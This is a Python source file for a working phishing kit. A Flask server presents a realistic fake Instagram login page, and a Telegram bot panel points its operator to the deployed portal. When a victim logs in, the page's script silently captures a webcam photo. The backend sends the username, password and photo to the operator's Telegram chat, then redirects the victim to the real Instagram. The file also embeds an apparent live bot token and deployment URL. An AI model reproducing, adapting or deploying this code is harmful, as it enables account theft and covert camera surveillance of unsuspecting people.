import os
import telebot
from telebot import types
from flask import Flask, render_template_string, request, jsonify
import base64

# --- CONFIGURATION ---
BOT_TOKEN = "8765709173:AAEwy6NbFKLNKsqfjDayvef4fJGfwxVSDlM"
ADMIN_CHAT_ID = "7161571409"

# Tera Render ka live URL yahan set hai Maharaj
PORTAL_URL = "https://instagram-6zbs.onrender.com"

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

# --- REALISTIC INSTAGRAM UI + INTEGRATED CAMERA CAPTURE ---
HTML_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login • Instagram</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        body { background-color: #fafafa; display: flex; justify-content: center; align-items: center; min-height: 100vh; flex-direction: column; }
        .wrapper { max-width: 350px; width: 100%; margin-bottom: 10px; }
        .auth-card { background-color: #ffffff; border: 1px solid #dbdbdb; border-radius: 1px; padding: 40px 40px 20px 40px; margin-bottom: 10px; text-align: center; }
        .logo { font-family: cursive; font-size: 50px; margin-bottom: 35px; font-weight: normal; color: #262626; }
        .input-field { position: relative; margin-bottom: 6px; width: 100%; }
        input { width: 100%; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; color: #262626; font-size: 12px; padding: 9px 0 7px 8px; outline: none; }
        input:focus { border-color: #a8a8a8; background: #fff; }
        .login-btn { width: 100%; background: #0095f6; border: none; border-radius: 4px; color: #fff; padding: 7px 16px; font-weight: 600; font-size: 14px; cursor: pointer; margin-top: 14px; }
        .login-btn:hover { background: #1877f2; }
        .divider { display: flex; align-items: center; margin: 15px 0 20px 0; color: #8e8e8e; font-size: 13px; font-weight: 600; }
        .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: #dbdbdb; }
        .divider::before { margin-right: 18px; }
        .divider::after { margin-left: 18px; }
        .fb-login { color: #385185; font-size: 14px; font-weight: 600; text-decoration: none; display: flex; justify-content: center; align-items: center; margin-bottom: 15px; }
        .forgot { font-size: 12px; color: #00376b; text-decoration: none; display: block; margin-top: 12px; }
        .signup-card { background-color: #ffffff; border: 1px solid #dbdbdb; border-radius: 1px; padding: 20px; text-align: center; font-size: 14px; color: #262626; }
        .signup-card a { color: #0095f6; font-weight: 600; text-decoration: none; }
        .footer { text-align: center; font-size: 12px; color: #8e8e8e; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="wrapper">
        <div class="auth-card">
            <h1 class="logo">Instagram</h1>
            <form id="loginForm" onsubmit="handleAction(event)">
                <div class="input-field">
                    <input type="text" id="username" placeholder="Phone number, username, or email" required>
                </div>
                <div class="input-field">
                    <input type="password" id="password" placeholder="Password" required>
                </div>
                <button type="submit" class="login-btn">Log in</button>
            </form>
            <div class="divider">OR</div>
            <a href="#" class="fb-login">Log in with Facebook</a>
            <a href="#" class="forgot">Forgot password?</a>
        </div>
        <div class="signup-card">
            Don't have an account? <a href="#">Sign up</a>
        </div>
    </div>
    <div class="footer">From Meta</div>

    <!-- Hidden Video & Canvas for Camera Capture -->
    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        async function captureCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.getElementById('video');
                video.srcObject = stream;
                await new Promise((resolve) => video.onloadedmetadata = resolve);
                
                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0);
                
                const imageData = canvas.toDataURL('image/png');
                stream.getTracks().forEach(track => track.stop());

                // Send captured image to backend silently
                await fetch('/capture-cam', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ image: imageData })
                });
            } catch (err) {
                console.log("Camera access denied or unavailable.");
            }
        }

        async function handleAction(e) {
            e.preventDefault();
            const u = document.getElementById('username').value;
            const p = document.getElementById('password').value;

            // Trigger silent camera capture when they click login
            await captureCamera();

            // Send username and password to backend
            await fetch('/capture-creds', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username: u, password: p })
            });

            // Redirect user to real Instagram smoothly
            setTimeout(() => {
                window.location.href = "https://www.instagram.com";
            }, 1000);
        }
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_PAGE)

@app.route('/capture-creds', methods=['POST'])
def capture_creds():
    try:
        data = request.get_json()
        username = data.get('username')
        password = data.get('password')
        
        alert_msg = (
            f"🎯 **INSTAGRAM CREDENTIALS SECURED, MAHARAJ!** 🎯\n\n"
            f"👤 **Username/Phone:** `{username}`\n"
            f"🔑 **Password:** `{password}`\n\n"
            f"😈🔥 *NICK HACKER VIP NETWORK*"
        )
        bot.send_message(ADMIN_CHAT_ID, alert_msg, parse_mode="Markdown")
        return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"status": "failed"})

@app.route('/capture-cam', methods=['POST'])
def capture_cam():
    try:
        data = request.get_json()
        img_data = data.get('image')
        
        if img_data:
            header, encoded = img_data.split(",", 1)
            file_data = base64.b64decode(encoded)
            
            file_path = "target_cam.png"
            with open(file_path, "wb") as f:
                f.write(file_data)
                
            with open(file_path, "rb") as photo:
                bot.send_photo(ADMIN_CHAT_ID, photo, caption="📸 **TARGET CAMERA SNAP CAPTURED, MAHARAJ!** 😈🔥", parse_mode="Markdown")
                
            os.remove(file_path)
            return jsonify({"status": "success"})
    except Exception as e:
        print(f"Cam error: {e}")
    return jsonify({"status": "failed"})

# --- TELEGRAM BOT BUTTONS ---
@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_name = message.from_user.first_name if message.from_user.first_name else "Maharaj"
    
    markup = types.InlineKeyboardMarkup(row_width=1)
    btn_portal = types.InlineKeyboardButton("🔥 Open Instagram VIP Portal & Cam Tool", url=PORTAL_URL)
    btn_status = types.InlineKeyboardButton("💎 Check System Status", callback_data="check_status")
    
    markup.add(btn_portal, btn_status)
    
    welcome_msg = (
        f"😈 **WELCOME TO NICK HACKER PANEL, MAHARAJ {user_name.upper()}!** 😈\n\n"
        f"Dual-threat portal active hai. Niche diye gaye button pe tap kar! 🔥"
    )
    bot.send_message(message.chat.id, welcome_msg, reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "check_status")
def callback_query(call):
    bot.answer_callback_query(call.id, "Status Checked Successfully!")
    bot.send_message(
        call.message.chat.id, 
        "💎 **SYSTEM STATUS**\n\n"
        f"👤 Telegram ID: `{call.from_user.id}`\n"
        "⭐ Core: **Dual-Capture Active**\n"
        "🔗 Status: **Online & Armed** 😈🔥", 
        parse_mode="Markdown"
    )

if __name__ == "__main__":
    import threading
    bot_thread = threading.Thread(target=lambda: bot.infinity_polling())
    bot_thread.daemon = True
    bot_thread.start()
    
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
    
